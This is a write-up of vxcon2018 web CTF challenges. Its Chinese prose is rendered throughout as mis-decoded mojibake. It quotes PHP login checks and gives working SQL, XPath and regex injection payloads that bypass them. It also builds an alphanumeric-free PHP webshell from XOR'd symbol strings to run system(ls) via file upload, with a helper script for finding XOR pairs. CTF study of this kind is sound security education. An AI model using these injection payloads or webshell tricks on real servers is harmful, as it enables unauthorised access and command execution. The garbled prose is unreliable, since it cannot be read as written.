# vxcon2018
é€™æ¬¡æ¯”è³½å€‹äººè¦ºå¾—é›£åº¦æ²’æœ‰å¾ˆé«˜(å› ç‚ºæˆ‘è‡³å°‘æœ‰é ­ç·’:joy:)ï¼Œé¡Œç›®è³ªé‡éƒ½èƒ½ç¢ºä¿è®“æˆ‘å€‘å­¸åˆ°æ±è¥¿ï¼Œ ä¸‹é¢ç´€éŒ„ä¸€äº›è³½å¾Œè§£å‡ºä¾†çš„é¡Œç›®...

## Lock Pick Duck (1)
[source code](https://github.com/shinmao/CTF-writeups/blob/master/vxcon2018/lpd_source.php)  
payloadæ»¿è¶³ä¸‰å€‹æ¢ä»¶å°±èƒ½æ‹¿åˆ°ç¬¬ä¸€æŠŠflag  
```php
if(@preg_match("/^$U,$P$/m", $csvdb)){
        $flag++;
        echo "csvdb1\n";
    }

    if(@$sqldb->querySingle("SELECT username FROM users WHERE username='$U' AND password='$P'") == TRUE){
        $flag++;
        echo "sqldb1\n";
    }

    if(@$xmldb->xpath("//users/user[username='$U' and password='$P']") == TRUE){
        $flag++;
        echo "xmldb1\n";
    }
```
ä¸Šé¢æ˜¯é€šéçš„ä¸‰å€‹æ¢ä»¶ï¼š  
2å’Œ3å¾ˆç°¡å–®ï¼Œsql injection å’Œ xpath injection ç”¨
```php
?username='or''='&password='or''='
```
å°±å¯ä»¥é€šé  
ç¬¬ä¸€å€‹æ¢ä»¶æˆ‘å°±æƒ³äº†å¾ˆä¹…ï¼Œæ³¨å…¥æ­£å‰‡æƒ³ä¹ŸçŸ¥é“æ´å¾ˆå¤§ï¼Œå»é²é²æƒ³ä¸åˆ°æ€éº¼æ³¨å…¥  
è³½å¾Œæ‰çŸ¥é“ï¼Œä¸å¦‚è®“å…¨éƒ¨éƒ½åŒ¹é…å§:+1:  
```php
?username=(.*)|' or ''='&password=(.*)|' or ''='
```
é€™æ¨£å°±å¯ä»¥æ‹¿åˆ°ç¬¬ä¸€æŠŠflagï¼š `Flag 1: vxctf{y0u_d0_kn0w_InjectI0n_101}`  
é™¤æ­¤ä¹‹å¤–ï¼Œè‚¯å®šé‚„æœ‰å¾ˆå¤šç¹éæ–¹æ³•

## Lock Pick Duck (2)
ç¹¼ä¸Šé¡Œä¸€æ¨£çš„source codeï¼Œpayloadæ»¿è¶³å…­å€‹æ¢ä»¶å°±èƒ½æ‹¿åˆ°ç¬¬äºŒæŠŠflag  
ç¬¬äºŒé¡Œæˆ‘ç›®å‰æœ€å¤šåªèƒ½æ§‹é€ åˆ°å››å€‹æ¢ä»¶ï¼Œxpathçš„æ¢ä»¶éƒ½è·Ÿå…¶ä»–æ¢ä»¶è¡çª  
ä¸éä¹Ÿå­¸åˆ°ä¸å°‘é—œæ–¼`preg_match`è·Ÿæ­£å‰‡çš„é—œä¿‚  
payload: `http://trick.fflm.ml/?username=(a)|' union select 'a'--&password=a`  
å¿…é ˆé‡è¤‡åˆ·æ–°ç›´åˆ°csvæ¶æ§‹ä¸­å‡ºç¾**a**å­—å…ƒï¼š`Flag 1: vxctf{y0u_d0_kn0w_InjectI0n_101}`  
![](https://github.com/shinmao/CTF-writeups/blob/master/vxcon2018/screenshot/LDP4conditions.png)


## Patch Peep Huck (w)
```php
 <?=
!$I=&$_FILES[!!$l='tmp_name'] || $I['size']>>7 || preg_match('/\w/',join(file($I[$l])))?
!show_source(__FILE__) : !include($I[$l]);
```
æˆ‘åœ¨æ¯”è³½æ™‚ç¢°åˆ°äº†**è®€ä¸æ‡‚ä»£ç¢¼**çš„å•é¡Œ:cold_sweat:  
è³½å¾Œçœ‹äº†@kaibroçš„wpçœŸçš„æ˜¯è®“æˆ‘é©šå‘†äº†å‘€  
é¦–å…ˆæ˜¯:
```php
$_FILES[!!$l='tmp_name']
```
é€™éƒ¨åˆ†ï¼Œæˆ‘å°`$_FILES`çš„çµæ§‹é‚„æ˜¯æœ‰æ‰€äº†è§£çš„ã€‚`tmp_name`æ‡‰è©²æ˜¯è¦åœ¨ç¬¬äºŒå±¤é™£åˆ—ä¹‹ä¸­ï¼Œæˆ‘åœ¨é€™è£¡å¡äº†å¥½ä¹…ã€‚åŸä¾†å•é¡Œå‡ºåœ¨`!!`ï¼Œ`!!`æœƒå°‡èªå¥è½‰ç‚ºbooleanå›å‚³true or falseï¼  
é€™è£å°‡`tmp_name`å‚³å…¥åƒæ•¸çš„å‹•ä½œä¸€å®šæœƒå›å‚³trueï¼Œå› æ­¤äº‹å¯¦ä¸Šé€™è£å‚³å…¥`$I`çš„æ±æ±å°±æ˜¯`$_FILES[1]`ã€‚  
è§£é–‹äº†ä»£ç¢¼çš„ç–‘æƒ‘ï¼Œå†ä¾†çœ‹é¡Œç›®æƒ³å¹¹å˜›ï¼š  
ä¸Šå‚³FILEï¼Œé™åˆ¶FILEçš„sizeï¼Œä¸¦ä¸”å°‡FILEçš„å…§å®¹joinæˆå­—ä¸²åšåŒ¹é…  
å…¸å‹çš„ä¸Šå‚³webshellé¡Œï¼Œå…§å®¹ä¸èƒ½å¸¶æœ‰å­—æ¯ï¼Œæ•¸å­—ï¼Œåº•ç·š  
(ä¸Šå‚³æª”æ¡ˆä¸ä¸€å®šè¦ç”¨burpä»£ç†ï¼Œä¹Ÿå¯ä»¥è‡ªå·±å¯«å€‹upload formï¼ŒæŠŠactionè¨­çµ¦é¡Œç›®å°±å¥½)  
ä¸€é–‹å§‹æˆ‘å¡åœ¨**åº•ç·šçš„éƒ¨åˆ†**å¾ˆä¹…ï¼Œè³½å¾Œçœ‹äº†@kaibroå¼•ç”¨äº†åœ¨@l4wä¸­çš„æŠ€å·§ -> è¡¨æƒ…ç¬¦è™Ÿ  
çµ‚æ–¼è‡ªå·±å¯«å‡ºäº†å€‹payloadï¼š  
```php
<?=
$ğŸ˜Š = "||||%-" ^ "/%/(``"; 
$ğŸ˜Š ("`|" ^ ",/");
```
å‰›é–‹å§‹è§£é¡Œçš„æ™‚å€™ï¼Œæˆ‘ä¹Ÿæœ‰å¸¸è­˜XORçš„æ€è·¯ï¼Œæ ¹æ“šPå¸«å‚…çš„èªªæ³•ï¼Œæˆ‘å€‘å¯ä»¥ç”¨å…©å€‹ç‰¹æ®Šç¬¦è™ŸåšXORæ§‹é€ å‡ºa-zä¹‹é–“çš„å­—æ¯ï¼Œå¯æ˜¯æˆ‘å»æ€éº¼æ¹Šéƒ½æ¹Šä¸å‡ºä¾†...  
è³½å¾Œæ‰æƒ³åˆ°ï¼Œä¹¾è„†ä¾†å¯«å€‹phpï¼ŒæŠŠæ‰€ä»¥ç‰¹æ®Šç¬¦è™Ÿä¹‹é–“çš„XORéƒ½åˆ—å‡ºä¾†ï¼Œç›´æ¥æŸ¥è¡¨ä¸å°±å¾—äº†:  
```php
$arr1 = array("!","'","#","%","&","(",")","[","]","/","\\","?",".",",","^","_","~","*","+","-","<",">","=","{","}","\"",":",";","`","|");
$arr2 = array("!","'","#","%","&","(",")","[","]","/","\\","?",".",",","^","_","~","*","+","-","<",">","=","{","}","\"",":",";","`","|");

foreach ($arr1 as $value1) {
	foreach ($arr2 as $value2) {
		$x = $value1^$value2;
		print($x." ".$value1." ".$value2);
		echo "<br/>";
	}
	echo "<br/>";
}
```
æ–¼æ˜¯é€šéä¸Šé¢çš„æ‡¶èŸ²æ³•ï¼Œæˆ‘æˆåŠŸæ¹Šå‡ºäº†`<?=SYSTEM(LS);`çš„payload  

## Reference
1. [Kaibro WP](https://github.com/w181496/CTF/tree/master/vxcon2018)  
2. [å®˜æ–¹è©³è§£](https://github.com/ozetta/ctf-challenges)  
3. [ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
